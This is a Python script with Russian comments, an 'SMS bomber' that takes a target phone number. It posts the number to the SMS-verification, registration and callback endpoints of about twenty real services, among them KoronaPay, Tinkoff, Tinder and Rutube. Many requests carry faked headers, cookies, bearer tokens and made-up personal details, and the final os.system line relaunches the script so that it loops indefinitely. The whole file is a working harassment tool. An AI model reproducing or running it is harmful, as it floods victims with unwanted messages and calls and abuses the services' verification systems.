import os
import requests
import sys

# KoronaPay
koronapay = requests.post("https://koronapay.com/transfers/online/api/users/otps",
data={"phone": sys.argv[1]},

headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87)",
        "X-Requested-With": "XMLHttpRequest",
     },
)

print ("{KORONAPAY} Код ответа сервера - " + str(koronapay))

# Ivi

ivi = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",
data={"phone": sys.argv[1]},
headers={
        "User-Agent": "Nokia7610/2.0 (5.0509.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0",
        "X-Requested-With": "XMLHttpRequest",
     },

)

print ("{IVI} Код ответа сервера - " + str(ivi))

# Izi

izi = requests.post("https://izi.ua/api/auth/sms-login", json={"phone": sys.argv[1]},
headers={
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; MALC)",
        "X-Requested-With": "XMLHttpRequest",
     },
)

print ("{IZI} Код ответа сервера - " + str(izi))

# Uklon

uklon = requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",
            headers={"client_id": "6289de851fc726f887af8d5d7a56c6d",
                'Content-type': 'application/json',
                'Accept': 'application/json, text/plain',
                'Authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/81.0.4044.138 Chrome/81.0.4044.138 Safari/537.36',
                'Cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
                },
            json={"phone": sys.argv[1]},
)

print ("{UKLON} Код ответа сервера - " + str(uklon))

# Tinkoff

tinkoff = requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": sys.argv[1]},
headers={
        "User-Agent": "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
        "X-Requested-With": "XMLHttpRequest",
     },
)

print ("{TINKOFF} Код ответа сервера - " + str(tinkoff))

# Rutube

rutube = requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",
            json={"phone": sys.argv[1]},
headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.52",
        "X-Requested-With": "XMLHttpRequest",
     },
)

print ("{RUTUBE} Код ответа сервера - " + str(rutube))

# Tinder

tinder = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
            data={"phone_number": sys.argv[1]},
headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87)",
        "X-Requested-With": "XMLHttpRequest",
     },
)

print ("{TINDER} Код ответа сервера - " + str(tinder))

# Helsi

helsi = requests.post("https://helsi.me/api/healthy/accounts/login",
            json={"phone": sys.argv[1], "platform": "PISWeb"},
headers={
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "X-Requested-With": "XMLHttpRequest",
     },
)

print ("{HELSI} Код ответа сервера - " + str(helsi))

# Easypay

easypay = requests.post("https://api.easypay.ua/api/auth/register",
            json={"phone": sys.argv[1], "password": "1ejqwhefihqw"},
headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87)",
        "X-Requested-With": "XMLHttpRequest",
     },
)

print ("{EASYPAY} Код ответа сервера - " + str(easypay))

# Lenta

lenta = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
            json={"phone": sys.argv[1]},
headers={
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 4.0.4; pt-br; MZ608 Build/7.7.1-141-7-FLEM-UMTS-LA) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
        "X-Requested-With": "XMLHttpRequest",
     },
)

# Moyo

moyo = requests.post("https://www.moyo.ua/identity/registration",
            data={
                "firstname": "Артем Джедаи",
                "phone": sys.argv[1],
                "email": "123.123@gmail.com",
            },
headers={
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "X-Requested-With": "XMLHttpRequest",
     },
)

print ("{MOYO} Код ответа сервера - " + str(moyo))

# WiFi-Metro

wifimetro = requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",
            data={"msisdn": sys.argv[1]},
            headers={"App-ID": "cabinet"},
)

print ("{WiFi-Metro} Код ответа сервера - " + str(wifimetro))

# Webbankir

webbankir = requests.post ("https://ng-api.webbankir.com/user/v2/create",
            json={
                "lastName": "Fuiejf",
                "firstName": "Artew",
                "middleName": "Dim",
                "mobilePhone": sys.argv[1],
                "email": "123.123@gmail.com",
                "smsCode": "12349",
            },
headers={
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 4.0.4; pt-br; MZ608 Build/7.7.1-141-7-FLEM-UMTS-LA) AppleWebKit/534.30 (KHTML, like Gecko)",
        "X-Requested-With": "XMLHttpRequest",
     },
)

print ("{WEB-BANKIR} Код ответа сервера - " + str(webbankir))

# SMS4B

sms4b = requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": sys.argv[1], "ajax_demo_send": "1"},
headers={
        "User-Agent": "Outlook-iOS/709.2189947.prod.iphone (3.24.0)",
        "X-Requested-With": "XMLHttpRequest",
     },
        )

print ("{SMS4B} Код ответа сервера - " + str(sms4b))

# Mobileplanet

mobileplanet = requests.post("https://mobileplanet.ua/register",
            data={
                "klient_name": "edureka",
                "klient_phone": "+" + sys.argv[1],
                "klient_email": "artemkartka@gmail.com",
            },
headers={
        "X-Requested-With": "XMLHttpRequest",
        'Content-type': 'application/json',
        'Accept': 'application/json, text/plain',
        'Authorization': 'TEMA yuswqerg3yeu6hrr4r9j3gw6',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/81.0.4044.138 Chrome/81.0.4044.138 Safari/537.36',
        'Cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
                },
        )

print ("{MobilePlanet} Код ответа сервера - " + str(mobileplanet))

# N13423

n13423 = requests.post("https://n13423.yclients.com/api/v1/book_code/312054", data={"phone": sys.argv[1]},
headers={
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "X-Requested-With": "XMLHttpRequest",
        'Content-type': 'application/json',
        'Accept': 'application/json, text/plain',
        'Authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
        'Cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
     },
)

print ("{N13423} Код ответа сервера - " + str(n13423))

# Junior

junior = requests.post("https://junker.kiev.ua/postmaster.php", data={
            "'tel': sys.argv[1] ,'name': '1234567890abcdefghigklmnopqrstuvyxw','action':'callme'",
},
headers={
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "X-Requested-With": "XMLHttpRequest",
        'Content-type': 'application/json',
        'Accept': 'application/json, text/plain',
        'Cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
        },
)

print ("{KYIV-JUNIOR} Код ответа сервера - " + str(junior))

# Termux-Lab-Call

termuxlabcall = requests.get("http://link.io.xsph.ru/call.php?termuxlab=termuxlab&phone="+sys.argv[1])

print ("{Бешанный таджик} Код ответа сервера - " + str(termuxlabcall))

#BELTECOM3

beltecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': sys.argv[1]},
headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.99",
        "X-Requested-With": "XMLHttpRequest",
        'Content-type': 'application/json',
        'Accept': 'application/json, text/plain',
        'Cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
}
)

print ("{BELTECOM3} Код ответа сервера - " + str(beltecom))

#SportMaster

sportmaster = requests.post("https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone="+sys.argv[1],

headers={
                'Content-type': 'application/json',
                'Accept': 'application/json, text/plain',
                'authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/81.0.4044.138 Chrome/81.0.4044.138 Safari/537.36',
                'cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
                }
)

print ("{SPORTMASTER} Код ответа сервера - " + str(sportmaster))

# GetManCar

getmancar = requests.post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": sys.argv[1],"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"},
headers={
                'Content-type': 'application/json',
                'Accept': 'application/json, text/plain',
                'authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/81.0.4044.138 Chrome/81.0.4044.138 Safari/537.36',
                'cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
                }
)

os.system ("python3 sms-bomber.py sys.argv[1]")

